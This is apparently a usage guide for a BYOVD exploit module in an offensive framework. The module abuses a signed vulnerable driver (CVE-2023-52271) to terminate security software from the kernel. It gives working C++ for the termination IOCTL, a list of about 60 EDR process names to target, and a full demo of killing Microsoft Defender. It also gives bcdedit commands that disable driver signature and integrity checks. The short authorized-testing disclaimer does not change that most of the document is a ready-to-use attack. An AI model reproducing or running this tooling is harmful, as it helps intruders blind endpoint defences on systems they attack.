# BYOVD Exploit - Usage Guide

## Overview

The BYOVD (Bring Your Own Vulnerable Driver) exploit leverages **CVE-2023-52271** in `vulndriver.sys` (wsftprm.sys) to gain kernel-level process termination capabilities via `ZwTerminateProcess`.

**Why vulndriver.sys?**
- ✅ NOT on Microsoft's driver blocklist (as of 2026)
- ✅ Signed by TPZ SOLUCOES DIGITAIS LTDA
- ✅ Provides direct kernel-level access

## How It Works

### 6-Step Attack Chain

1. **Enable SeLoadDriverPrivilege** - Obtains permission to load kernel drivers
2. **Deploy Driver** - Copies vulndriver.sys to system TEMP directory
3. **Create Service** - Registers the driver as a Windows service ("WarsawPMDriver")
4. **Start Driver** - Loads the vulnerable driver into kernel space
5. **Open Device Handle** - Connects to `\\.\Warsaw_PM` device object
6. **Test Kernel Access** - Verifies IOCTL 0x22201C works for ZwTerminateProcess

### The Kill Mechanism

```cpp
// IOCTL: 0x22201C
// Buffer: 1036 bytes
// First 4 bytes = Target PID
```

When you send this IOCTL to the driver with a target PID:
- Driver calls `ZwTerminateProcess` from **kernel space**
- Bypasses all user-mode protections (process handles, access rights, etc.)
- **Even protected processes** (PPL/PPE) can be terminated

## Interactive TUI Workflow

### When you run the exploit from TUI:

**Step 1: Driver Path Selection**
```
[?] Driver Path
    Default: C:\EDR-Test\vulndriver.sys
    Enter path (or press ENTER for default): _
```

**Step 2: Target Selection Mode**
```
[i] Target Selection:
    1. Auto-detect and show EDR processes
    2. Manual PID entry
    3. Skip termination (load driver only)
    
    Choice: _
```

### Mode 1: Auto-Detect EDR Processes

The framework automatically scans for 60+ EDR processes including:

**Detected EDRs:**
- Microsoft Defender (MsMpEng.exe, MsSense.exe, etc.)
- CrowdStrike Falcon (CSFalconService.exe, CSAgent.exe)
- SentinelOne (SentinelAgent.exe)
- Carbon Black (cb.exe, cbdefense.exe)
- Symantec, McAfee, Trend Micro, Kaspersky, ESET, Sophos, etc.

**Example Output:**
```
[!] Detected EDR Processes:
========================================
  [1] PID: 2548 | MsMpEng.exe
      Path: C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe
  [2] PID: 3124 | MsSense.exe
      Path: C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe
========================================

[?] Select process to terminate (1-2) or 0 to skip: _
```

### Mode 2: Manual PID Entry

```
[i] Target Selection:
    ...
    Choice: 2

    Enter target PID: 2548
```

Use this when you know the exact PID (e.g., from Task Manager or Process Hacker).

### Mode 3: Load Driver Only

Loads the driver and establishes kernel access **without** terminating any process.

Useful for:
- Testing driver deployment
- Preparing for manual IOCTL calls
- Staging before attack

## What Each Option Does

### Option 1 (Auto-Detect)
1. Enumerates **all running processes** using `CreateToolhelp32Snapshot`
2. Matches process names against **60+ known EDR signatures**
3. Displays detected EDRs with PIDs and full paths
4. Prompts for selection
5. Calls `terminateProcess(pid)` → Sends IOCTL 0x22201C

### Option 2 (Manual PID)
1. Takes user-supplied PID directly
2. Calls `terminateProcess(pid)` → Sends IOCTL 0x22201C
3. No validation (you can target ANY process)

### Option 3 (Load Only)
1. Completes steps 1-6 of attack chain
2. Leaves driver loaded in kernel
3. Device handle remains open (`\\.\Warsaw_PM`)
4. You can manually send IOCTLs via code/scripts

## Technical Deep Dive

### What `terminateProcess(uint32_t pid)` Does

```cpp
bool BYOVDRTCore::terminateProcess(uint32_t pid) {
    // 1. Prepare 1036-byte buffer
    uint8_t buffer[1036] = {0};
    *reinterpret_cast<uint32_t*>(buffer) = pid;  // First 4 bytes = PID
    
    // 2. Send IOCTL to device
    BOOL result = DeviceIoControl(
        hDevice_,           // Handle to \\.\Warsaw_PM
        0x22201C,           // IOCTL code for ZwTerminateProcess
        buffer,             // Input buffer with PID
        sizeof(buffer),     // 1036 bytes
        NULL,               // No output buffer
        0,
        &bytesReturned,
        NULL
    );
    
    // 3. Driver executes ZwTerminateProcess(pid) in kernel
    //    → Process is terminated regardless of protections
}
```

### Why This Bypasses EDR

**Normal process termination:**
```
User App → OpenProcess() → TerminateProcess()
          ↓
        EDR hooks/blocks here
```

**BYOVD termination:**
```
User App → DeviceIoControl(IOCTL 0x22201C, PID)
          ↓
    Vulnerable Driver (kernel-mode)
          ↓
    ZwTerminateProcess() ← No EDR hooks in kernel!
```

EDRs hook **user-mode APIs** (OpenProcess, TerminateProcess, etc.), but the driver calls the **kernel function directly**.

## Supported EDR Signatures

The auto-detection recognizes these EDR families:

| EDR Vendor | Process Names |
|------------|--------------|
| **Microsoft Defender** | MsMpEng.exe, MsSense.exe, SecurityHealthService.exe |
| **CrowdStrike** | CSFalconService.exe, CSAgent.exe, CSShell.exe |
| **SentinelOne** | SentinelAgent.exe, SentinelServiceHost.exe |
| **Carbon Black** | cb.exe, cbdefense.exe, RepCLI.exe |
| **Symantec** | ccSvcHst.exe, SymEFASi.exe, SepWscSvc.exe |
| **McAfee/Trellix** | McShield.exe, mfemms.exe, mfevtps.exe |
| **Trend Micro** | PccNTMon.exe, ntrtscan.exe, tmlisten.exe |
| **Kaspersky** | avp.exe, kavfs.exe, ksde.exe |
| **ESET** | ekrn.exe, egui.exe |
| **Sophos** | SophosHealth.exe, SophosFS.exe |
| **Palo Alto** | CyServer.exe, Cyvera.exe, Traps.exe |
| **Cylance** | CylanceSvc.exe |
| **FireEye/Mandiant** | xagt.exe |
| **Fortinet** | FortiClient.exe |
| **Cisco AMP** | sfc.exe, immunetprotect.exe |

Full list contains **60+ process names** across all major EDR vendors.

## Example Demo Workflow

### Scenario: Kill Windows Defender on Windows 10

```bash
# 1. Copy vulndriver.sys to target location
C:\> mkdir C:\EDR-Test
C:\> copy vulndriver.sys C:\EDR-Test\

# 2. Run framework with admin privileges
C:\> cd EDR-Adaptive-Framework\build\bin\Release
C:\> edr_framework.exe

# 3. Select BYOVD exploit
edr > 1
[1] exploit/privesc/byovd T1068

# 4. Configure attack
[?] Driver Path: [ENTER for default]
[i] Target Selection: 1  (auto-detect)

# 5. Framework shows detected EDR
[!] Detected EDR Processes:
  [1] PID: 2548 | MsMpEng.exe
  [2] PID: 3124 | MsSense.exe

# 6. Select target
[?] Select process to terminate: 1

# 7. Observe attack chain
[1/6] Enabling SeLoadDriverPrivilege... ✓
[2/6] Deploying driver... ✓
[3/6] Creating driver service... ✓
[4/6] Starting driver... ✓
[5/6] Opening device handle... ✓
[6/6] Testing kernel access... ✓

[*] Attempting to terminate MsMpEng.exe (PID: 2548)...
[+] IOCTL 0x22201C sent successfully for PID 2548

✓ Successfully terminated MsMpEng.exe (PID 2548)
```

### Verification

Check if Defender is actually killed:
```powershell
Get-Service WinDefend
# Status: Stopped

tasklist | findstr MsMpEng
# (no output - process terminated)
```

## Safety & Cleanup

**Automatic cleanup happens when framework exits:**
```
[*] Cleaning up BYOVD artifacts...
[+] Device handle closed
[+] Service stopped
[+] Service deleted
[+] Driver file deleted
```

**Manual cleanup (if needed):**
```cmd
sc stop WarsawPMDriver
sc delete WarsawPMDriver
del /F %TEMP%\vulndriver.sys
```

## Troubleshooting

### "Failed to enable SeLoadDriverPrivilege"
- Not running as Administrator
- Solution: Right-click → Run as Administrator

### "Failed to deploy driver"
- Driver file not found at specified path
- Solution: Verify `C:\EDR-Test\vulndriver.sys` exists

### "Failed to start driver"
- Driver Signature Enforcement (DSE) enabled
- Solution: Boot Windows with Test Mode:
  ```cmd
  bcdedit /set testsigning on
  bcdedit /set nointegritychecks on
  shutdown /r /t 0
  ```

### "DeviceIoControl failed: 0x5"
- Access Denied (ERROR_ACCESS_DENIED)
- Target process is System/csrss (critical system process)
- Solution: Choose a different target

### "No EDR processes detected"
- System doesn't have EDR installed, or EDR uses non-standard process names
- Solution: Use Mode 2 (Manual PID Entry) with Task Manager

## Advanced: Integrating with ML Engine

The BYOVD exploit integrates with the ML-based strategy selector:

```cpp
// ML engine learns which EDR processes to target first
// Based on:
// - System resource consumption
// - Process restart behavior
// - EDR detection patterns
```

Future enhancements will auto-select optimal targets based on learned patterns.

## Security Considerations

**This tool is for AUTHORIZED TESTING ONLY:**
- ✅ Use in lab environments
- ✅ Use with permission on production systems
- ✅ Document all activities
- ❌ Do NOT use on systems you don't own/control

**Legal Notice:**
Unauthorized use of kernel-level exploits may violate:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Local cybersecurity laws

Always obtain written authorization before testing.

## References

- **CVE-2023-52271**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-52271
- **MITRE ATT&CK T1068**: https://attack.mitre.org/techniques/T1068/
- **Original Research**: AV-EDR-Killer project (Rust implementation)
- **Warsaw Banking Software**: Origin of wsftprm.sys (legitimate driver with vulnerability)

---

**Project:** VYUHA (EDR-Adaptive-Framework)  
**Component:** Exploits Module (Bipin)  
**Date:** February 2026
